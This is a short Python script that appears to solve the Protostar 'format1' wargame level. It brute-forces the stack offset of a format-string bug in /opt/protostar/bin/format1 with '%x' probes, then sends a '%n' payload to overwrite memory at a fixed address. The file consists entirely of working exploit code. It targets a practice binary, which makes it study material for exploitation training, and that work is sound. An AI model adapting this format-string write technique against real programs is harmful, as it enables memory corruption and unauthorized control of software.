#!/usr/bin/env python
#-*- coding: utf-8 -*-

import sys
import struct
import subprocess


found = False
for i in range(1, 800):
    payload = struct.pack('<L', 0x41414141)
    payload += '.%' + str(i) + '\$x'
    res = subprocess.check_output('/opt/protostar/bin/format1 ' + payload, shell=True)
    if res.strip() == 'AAAA.41414141':
        found = True
        break

if found:
    print('[+] Offset = {0}'.format(i))
    payload = struct.pack('<L', 0x08049638)
    payload += '.%' + str(i) + '\$n'
    subprocess.call('/opt/protostar/bin/format1 ' + payload, shell=True)
else:
    print('[-] Not found')

